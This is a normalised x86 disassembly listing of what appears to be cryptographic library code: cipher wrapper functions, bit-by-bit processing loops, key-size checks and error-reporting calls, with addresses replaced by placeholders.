mov eax [ esp + 0x10 ]
test eax eax
jg r-xdata
je r-xdata
mov [ ebp ] 0x0
test ebx ebx
je r-xdata
mov dl [ eax + ecx ]
mov [ ebp ] dl
mov dl [ eax + ecx ]
inc ebp
cmp dl 0xa
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
jmp r-xdata
mov edi 0x1
inc eax
mov edx [ esi + 0xc ]
inc eax
cmp eax edx
jl r-xdata
jmp r-xdata
sub_10025420
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x8 ]
not ecx
dec ecx
push ecx
push edx
push eax
call sub_10024cf0
add esp 0xc
pop edi
retn
sub_100255e0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov ecx [ ebx ]
mov eax [ edi ]
sub eax ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ edi + 0x8 ]
mov esi [ edi ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax esi
jle r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ rw-data ]
push esi
push eax
call sub_1001e7c0
mov ecx [ ebx + 0x8 ]
mov edx [ edi + 0x8 ]
push ecx
push edx
call [ eax + 0x4 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10025670
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
push edi
test eax eax
je r-xdata
mov edx [ esi + 0x8 ]
push edx
call sub_100200c0
add esp 0x4
mov ecx eax
mov eax [ esi ]
pop edi
xor eax ecx
pop esi
retn
mov edi [ esi ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax edi
jle r-xdata
mov eax [ rw-data ]
push edi
push eax
call sub_1001e7c0
mov ecx [ esi + 0x8 ]
push ecx
call [ eax ]
add esp 0xc
mov ecx eax
mov eax [ esi ]
pop edi
xor eax ecx
pop esi
retn
sub_100256d0
mov eax 0x10
call sub_1001d0d0
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
xor ebx ebx
test edi edi
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
mov [ esp + 0x14 ] edi
mov esi eax
and ah 0x7f
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
push ecx
and esi 0x8000
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
push 0x3
call sub_100269f0
push sub_100255e0
push sub_10025670
call sub_1001fbd0
push 0x2
mov [ rw-data ] eax
call sub_100269f0
mov ecx [ rw-data ]
add esp 0x10
xor eax eax
test ecx ecx
setne al
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ eax + 0xc ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
test esi esi
jne r-xdata
inc ebx
cmp ebx 0xa
jg r-xdata
mov ecx [ eax + 0xc ]
mov eax [ rw-data ]
lea edx [ esp + 0xc ]
mov [ esp + 0x14 ] ecx
push edx
push eax
call sub_1001ff80
add esp 0x8
test eax eax
jne r-xdata
sub_100257b0
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
push 0xbf
push r--data
push 0x10
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
push 0x3
call sub_100269f0
push sub_100255e0
push sub_10025670
call sub_1001fbd0
push 0x2
mov [ rw-data ] eax
call sub_100269f0
mov edx [ rw-data ]
add esp 0x10
xor eax eax
test edx edx
setne al
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push eax
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x10 ]
mov edx ecx
and ch 0x7f
mov [ eax ] ecx
mov ecx [ esp + 0x14 ]
and edx 0x8000
mov [ eax + 0xc ] ecx
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
push edx
call sub_1001fcf0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
pop esi
retn
mov edx [ rw-data ]
mov eax [ edx + 0x5c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push edi
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
xor eax eax
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
pop edi
mov edi [ esi ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax edi
jle r-xdata
mov eax [ rw-data ]
push edi
push eax
call sub_1001e7c0
mov ecx [ esi + 0xc ]
mov edx [ esi ]
push ecx
mov ecx [ esi + 0x8 ]
push edx
push ecx
call [ eax + 0x8 ]
add esp 0x14
sub_10025980
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10041010
add esp 0x18
mov eax 0x1
retn
sub_100259b0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x50 ]
push ecx
push edx
mov edx [ eax + 0x60 ]
lea ecx [ eax + 0x20 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_100412f0
add esp 0x1c
mov eax 0x1
retn
sub_10025a10
mov eax [ esp + 0x4 ]
push edi
mov ecx [ eax ]
mov edi [ ecx + 0x4 ]
mov ecx [ esp + 0x14 ]
cmp ecx edi
jae r-xdata
mov edx [ esp + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x1c ]
sub edx edi
xor ebx ebx
mov [ esp + 0x20 ] edx
sub ebp esi
jmp r-xdata
mov eax 0x1
pop edi
retn
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x60 ]
push edx
lea ecx [ esi + ebp ]
push eax
push ecx
push esi
call sub_10041610
mov eax [ esp + 0x30 ]
add ebx edi
add esp 0x10
add esi edi
cmp ebx eax
jbe r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
retn
sub_10025a80
mov eax [ esp + 0x4 ]
lea ecx [ eax + 0x50 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10041640
add esp 0x18
mov eax 0x1
retn
sub_10025ac0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x5c ]
test ch 0x20
mov ecx [ esp + 0x10 ]
jne r-xdata
mov edx [ eax + 0x8 ]
push edx
lea edx [ eax + 0x50 ]
push edx
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push edx
call sub_10041510
add esp 0x1c
mov eax 0x1
retn
shl ecx 0x3
sub_10025b00
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x50 ]
push ecx
push edx
mov edx [ eax + 0x60 ]
lea ecx [ eax + 0x20 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_100415d0
add esp 0x1c
mov eax 0x1
retn
sub_10025b40
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x10 ]
and ecx 0x7
cmp ecx 0x3
je r-xdata
mov edx [ eax + 0x60 ]
mov eax [ eax + 0x58 ]
mov ecx [ esp + 0x8 ]
push edx
shl eax 0x3
push eax
push ecx
call sub_100416a0
cmp ecx 0x4
je r-xdata
mov eax 0x1
retn
push 0x6e
push r--data
push 0x8f
push 0x85
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov ecx [ esp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx [ eax + 0x60 ]
mov eax [ eax + 0x58 ]
mov ecx [ esp + 0x8 ]
push edx
shl eax 0x3
push eax
push ecx
call sub_10041a60
jmp r-xdata
add esp 0xc
test eax eax
jge r-xdata
sub_10025bc0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
add eax 0x4
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10042830
add esp 0x18
mov eax 0x1
retn
sub_10025bf0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x50 ]
push ecx
push edx
mov edx [ eax + 0x60 ]
lea ecx [ eax + 0x20 ]
mov eax [ esp + 0x18 ]
add edx 0x4
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_100430a0
add esp 0x1c
mov eax 0x1
retn
sub_10025c30
push ebp
mov ebp [ esp + 0x8 ]
push edi
mov eax [ ebp ]
mov edi [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
cmp eax edi
jae r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
push ebx
push esi
mov esi [ esp + 0x1c ]
sub edx edi
xor ebx ebx
sub eax esi
mov [ esp + 0x20 ] edx
mov [ esp + 0x14 ] eax
jmp r-xdata
pop edi
mov eax 0x1
pop ebp
retn
mov edx [ ebp + 0x60 ]
mov ecx [ ebp + 0x8 ]
add edx 0x4
push ecx
add eax esi
push edx
push eax
push esi
call sub_10043290
mov eax [ esp + 0x30 ]
add ebx edi
add esp 0x10
add esi edi
cmp ebx eax
jbe r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
pop edi
mov eax 0x1
pop ebp
retn
sub_10025ca0
mov eax [ esp + 0x4 ]
lea ecx [ eax + 0x50 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
add eax 0x4
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10043350
add esp 0x18
mov eax 0x1
retn
sub_10025ce0
push esi
mov esi [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
push ecx
push edx
push esi
call sub_1002b5e0
add esp 0x4
push eax
mov eax [ esi + 0x60 ]
add eax 0x4
push eax
call sub_10043500
add esp 0x10
mov eax 0x1
pop esi
retn
sub_10025d10
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
xor edi edi
cmp ebp edi
mov [ esp + 0x10 ] edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ebx [ esp + 0x28 ]
push ebx
call sub_10021330
mov esi eax
add esp 0x4
cmp esi 0x10
jbe r-xdata
lea eax [ esp + 0x14 ]
push esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push ebp
call sub_100437b0
mov edi eax
add esp 0x10
cmp edi esi
je r-xdata
push r--data
push 0xb3
push r--data
call sub_1001f8d0
mov eax [ esp + 0x10 ]
cmp eax 0x3a
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp eax 0x78
jne r-xdata
mov esi 0x80
cmp eax 0xa0
jne r-xdata
mov esi 0x40
jmp r-xdata
push 0x0
push esi
push 0x3
push ebx
call sub_1001dbc0
mov eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
push ebx
call sub_1002ba70
add esp 0x18
lea edx [ esp + 0x14 ]
push 0xffffffff
push edx
push 0x0
push 0x0
push 0x0
push ebx
call sub_1001d7e0
add esp 0x18
push 0xa3
push r--data
push 0x6c
push 0x6d
push 0x6
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi 0x28
jmp r-xdata
test edi edi
jle r-xdata
sub_10025d58
add esp 0xc
lea eax [ esp + 0x14 ]
push esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push ebp
call sub_100437b0
mov edi eax
add esp 0x10
cmp edi esi
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x3a
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp eax 0x78
jne r-xdata
mov esi 0x80
cmp eax 0xa0
jne r-xdata
mov esi 0x40
jmp r-xdata
push 0x0
push esi
push 0x3
push ebx
call sub_1001dbc0
mov eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
push ebx
call sub_1002ba70
add esp 0x18
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
lea edx [ esp + 0x14 ]
push 0xffffffff
push edx
push 0x0
push 0x0
push 0x0
push ebx
call sub_1001d7e0
add esp 0x18
push 0xa3
push r--data
push 0x6c
push 0x6d
push 0x6
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi 0x28
jmp r-xdata
test edi edi
jle r-xdata
sub_10025e10
push ebx
mov ebx [ esp + 0xc ]
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push edi
push eax
push 0x0
push 0x2
push esi
call sub_1001dbc0
mov eax [ esp + 0x24 ]
add esp 0x10
cmp eax 0x80
jne r-xdata
cmp eax 0x40
jne r-xdata
mov edi 0x3a
jmp r-xdata
xor ecx ecx
cmp eax 0x28
setne cl
dec ecx
and ecx 0xa0
mov edi ecx
mov edi 0x78
jmp r-xdata
push esi
call sub_10021330
add esi 0x10
push eax
push esi
push edi
push ebx
call sub_100436b0
add esp 0x14
pop edi
pop esi
sub_10025e80
mov eax [ esp + 0x8 ]
sub eax 0x0
je r-xdata
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1002b5e0
mov ecx [ esi + 0x60 ]
add esp 0x4
shl eax 0x3
mov [ ecx ] eax
mov eax 0x1
pop esi
retn
sub eax 0x2
je r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x60 ]
mov eax [ esp + 0x10 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax 0x1
retn
dec eax
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
jle r-xdata
or eax 0xffffffff
retn
xor eax eax
retn
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x60 ]
mov [ edx ] eax
mov eax 0x1
retn
sub_10025f00
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push esi
call sub_1002b5e0
mov ecx [ esi + 0x60 ]
add esp 0x4
push eax
push ecx
call sub_10043950
add esp 0xc
mov eax 0x1
pop esi
retn
sub_10025f30
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
mov ecx [ eax + 0x60 ]
push ecx
call sub_10043a50
add esp 0x10
mov eax 0x1
retn
sub_10025f60
mov eax [ esp + 0x4 ]
push edi
mov ecx [ eax ]
mov eax [ esp + 0x14 ]
mov edi [ ecx + 0x4 ]
cmp eax edi
jae r-xdata
mov ecx [ esp + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x1c ]
sub ecx edi
xor ebx ebx
mov [ esp + 0x20 ] ecx
sub ebp esi
mov eax 0x1
pop edi
retn
mov edx [ esp + 0x14 ]
lea ecx [ esi + ebp ]
mov eax [ edx + 0x60 ]
push eax
push ecx
push esi
call sub_10044000
mov eax [ esp + 0x2c ]
add ebx edi
add esp 0xc
add esi edi
cmp ebx eax
jbe r-xdata
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
retn
sub_10025fc0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_100440b0
add esp 0x18
mov eax 0x1
retn
sub_10025ff0
mov eax [ esp + 0x4 ]
lea ecx [ eax + 0x50 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10044ed0
add esp 0x18
mov eax 0x1
retn
sub_10026020
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x50 ]
push ecx
push edx
mov edx [ eax + 0x60 ]
lea ecx [ eax + 0x20 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_10045090
add esp 0x1c
mov eax 0x1
retn
sub_10026070
mov eax 0xd8
call sub_1001d0d0
mov eax [ esp + 0xe8 ]
push esi
mov esi [ esp + 0xe0 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x60 ]
mov ecx [ esp + 0xe4 ]
push eax
push ecx
call sub_10045290
add esp 0x8
mov eax 0x1
pop esi
add esp 0xd8
retn
push esi
call sub_1001dc50
and eax 0x7
add esp 0x4
cmp al 0x4
je r-xdata
push esi
call sub_1001dc50
and eax 0x7
add esp 0x4
cmp al 0x3
jne r-xdata
mov eax [ esp + 0xe4 ]
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_10045290
mov ecx [ esi + 0x60 ]
lea edx [ esp + 0xc ]
push ecx
push edx
call sub_10045440
lea eax [ esp + 0x14 ]
push 0xd8
push eax
call sub_10026870
add esp 0x18
mov eax 0x1
pop esi
add esp 0xd8
retn
sub_10026110
push ebp
mov ebp [ esp + 0x8 ]
push edi
mov eax [ ebp ]
mov edi [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
cmp eax edi
jae r-xdata
mov ecx [ esp + 0x18 ]
push ebx
sub ecx edi
push esi
mov esi [ esp + 0x1c ]
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x18 ]
xor ebx ebx
sub ecx esi
mov [ esp + 0x14 ] ecx
jmp r-xdata
pop edi
mov eax 0x1
pop ebp
retn
mov eax [ ebp + 0x60 ]
mov edx [ ebp + 0x8 ]
push edx
add ecx esi
lea edx [ eax + 0x100 ]
push edx
lea edx [ eax + 0x80 ]
push edx
push eax
push ecx
push esi
call sub_100455a0
mov eax [ esp + 0x38 ]
add ebx edi
add esp 0x18
add esi edi
cmp ebx eax
jbe r-xdata
mov ecx [ esp + 0x14 ]
pop esi
pop ebx
pop edi
mov eax 0x1
pop ebp
retn
sub_10026190
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x60 ]
lea edx [ ecx + 0x50 ]
add ecx 0x20
push edx
push ecx
lea ecx [ eax + 0x100 ]
lea edx [ eax + 0x80 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
push edx
call sub_10045680
add esp 0x20
mov eax 0x1
retn
sub_100261d0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x60 ]
mov edx [ ecx + 0x8 ]
add ecx 0x20
push edx
push ecx
lea ecx [ eax + 0x100 ]
lea edx [ eax + 0x80 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
push edx
call sub_100469f0
add esp 0x20
mov eax 0x1
retn
sub_10026210
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x60 ]
push edx
lea edx [ eax + 0x50 ]
add eax 0x20
push edx
push eax
lea eax [ ecx + 0x100 ]
lea edx [ ecx + 0x80 ]
push eax
mov eax [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push eax
push ecx
push edx
call sub_10046ed0
add esp 0x24
mov eax 0x1
retn
sub_10026250
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push edi
xor edi edi
test eax eax
jbe r-xdata
mov eax 0x1
pop edi
pop ecx
retn
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
jmp r-xdata
mov ebx edi
mov ecx 0x7
and ebx 0x7
mov eax 0x1
sub ecx ebx
mov esi edi
shl eax cl
mov ecx [ esp + 0x20 ]
shr esi 0x3
mov cl [ esi + ecx ]
and al cl
mov ecx [ edx + 0x8 ]
neg al
sbb al al
add edx 0x20
and eax 0x80
push ecx
mov [ esp + 0x20 ] al
mov eax [ edx + 0x40 ]
push edx
lea edx [ eax + 0x100 ]
lea ecx [ eax + 0x80 ]
push edx
push ecx
push eax
push 0x1
lea edx [ esp + 0x2b ]
push 0x1
lea eax [ esp + 0x38 ]
push edx
push eax
call sub_100470e0
mov al [ esi + ebp ]
mov edx 0x80
mov ecx ebx
add esp 0x24
sar edx cl
mov cl bl
not dl
and dl al
mov al [ esp + 0x13 ]
and al 0x80
shr al cl
or dl al
mov eax [ esp + 0x24 ]
inc edi
mov [ esi + ebp ] dl
cmp edi eax
jb r-xdata
mov edx [ esp + 0x18 ]
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
pop ecx
retn
sub_10026320
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x60 ]
mov edx [ ecx + 0x8 ]
add ecx 0x20
push edx
push ecx
lea ecx [ eax + 0x100 ]
lea edx [ eax + 0x80 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x24 ]
push eax
push 0x8
push ecx
push edx
call sub_100470e0
add esp 0x24
mov eax 0x1
retn
sub_10026370
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x60 ]
push eax
push edi
call sub_10047780
mov ecx [ esi + 0x60 ]
add edi 0x8
add ecx 0x80
push ecx
push edi
call sub_10047780
mov esi [ esi + 0x60 ]
mov ecx 0x20
add esp 0x10
mov eax 0x1
lea edi [ esi + 0x100 ]
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_100263c0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x60 ]
push eax
push edi
call sub_10047780
mov ecx [ esi + 0x60 ]
lea edx [ edi + 0x8 ]
add ecx 0x80
push ecx
push edx
call sub_10047780
mov eax [ esi + 0x60 ]
add edi 0x10
add eax 0x100
push eax
push edi
call sub_10047780
add esp 0x18
mov eax 0x1
pop edi
pop esi
retn
sub_10026410
mov eax [ esp + 0x8 ]
push esi
cmp eax 0x6
push edi
je r-xdata
mov edi [ esp + 0xc ]
mov esi [ esp + 0x18 ]
mov eax [ edi + 0x58 ]
push eax
push esi
call sub_10021900
add esp 0x8
test eax eax
jg r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
push esi
call sub_10047760
mov eax [ edi + 0x58 ]
add esp 0x4
cmp eax 0x10
jl r-xdata
pop edi
xor eax eax
pop esi
retn
cmp [ edi + 0x58 ] 0x18
jl r-xdata
lea ecx [ esi + 0x8 ]
push ecx
call sub_10047760
add esp 0x4
pop edi
mov eax 0x1
pop esi
retn
add esi 0x10
push esi
call sub_10047760
add esp 0x4
sub_10026480
mov eax [ esp + 0x4 ]
push edi
mov ecx [ eax ]
mov edi [ ecx + 0x4 ]
mov ecx [ esp + 0x14 ]
cmp ecx edi
jae r-xdata
mov edx [ esp + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x1c ]
sub edx edi
xor ebx ebx
mov [ esp + 0x20 ] edx
sub ebp esi
jmp r-xdata
mov eax 0x1
pop edi
retn
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x60 ]
push edx
lea ecx [ esi + ebp ]
push eax
push ecx
push esi
call sub_10047a00
mov eax [ esp + 0x30 ]
add ebx edi
add esp 0x10
add esi edi
cmp ebx eax
jbe r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
retn
sub_100264f0
mov eax [ esp + 0x4 ]
lea ecx [ eax + 0x50 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10047ab0
add esp 0x18
mov eax 0x1
retn
sub_10026520
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_10046500
add esp 0x18
mov eax 0x1
retn
sub_10026550
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x50 ]
push ecx
push edx
mov edx [ eax + 0x60 ]
lea ecx [ eax + 0x20 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_10047c60
add esp 0x1c
mov eax 0x1
retn
sub_10026590
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push edi
xor edi edi
test eax eax
jbe r-xdata
mov eax 0x1
pop edi
pop ecx
retn
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
jmp r-xdata
mov ebx edi
mov ecx 0x7
and ebx 0x7
mov edx 0x1
sub ecx ebx
mov esi edi
shl edx cl
mov ecx [ esp + 0x20 ]
shr esi 0x3
mov cl [ esi + ecx ]
and dl cl
lea ecx [ eax + 0x20 ]
neg dl
sbb dl dl
and edx 0x80
mov [ esp + 0x1c ] dl
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x60 ]
push edx
push ecx
push eax
push 0x1
lea ecx [ esp + 0x23 ]
push 0x1
lea edx [ esp + 0x30 ]
push ecx
push edx
call sub_10047e50
mov dl [ esi + ebp ]
mov eax 0x80
mov ecx ebx
add esp 0x1c
sar eax cl
mov cl bl
not al
and al dl
mov dl [ esp + 0x13 ]
and dl 0x80
shr dl cl
or al dl
inc edi
mov [ esi + ebp ] al
mov eax [ esp + 0x24 ]
cmp edi eax
jb r-xdata
mov eax [ esp + 0x18 ]
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
pop ecx
retn
sub_10026650
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edx [ eax + 0x20 ]
mov eax [ eax + 0x60 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
push 0x8
push edx
push eax
call sub_10047e50
add esp 0x1c
mov eax 0x1
retn
sub_100266b0
mov eax [ esp + 0x8 ]
push esi
cmp eax 0x6
je r-xdata
mov esi [ esp + 0x14 ]
push 0x8
push esi
call sub_10021900
add esp 0x8
test eax eax
jg r-xdata
or eax 0xffffffff
pop esi
retn
push esi
call sub_10047760
add esp 0x4
mov eax 0x1
pop esi
retn
xor eax eax
pop esi
retn
sub_100266f0
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
push 0x48
[ edi ]
not ecx
dec ecx
push r--data
lea esi [ ecx + 0x1 ]
push esi
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
pop ebx
retn
cmp esi 0x1
mov ecx eax
jbe r-xdata
push 0x4b
push r--data
push 0x41
push 0x68
push 0x7
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi ebx
sub edi eax
pop edi
pop esi
pop ebx
retn
mov [ ecx ] 0x0
mov [ ecx ] dl
inc ecx
dec esi
cmp esi 0x1
ja r-xdata
mov dl [ edi + ecx ]
test dl dl
je r-xdata
sub_10026770
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov edi [ esp + 0x10 ]
push 0x58
push r--data
push edi
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx edi
mov edi eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0x5b
push r--data
push 0x41
push 0x67
push 0x7
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
sub_100267d0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push esi
xor esi esi
push edi
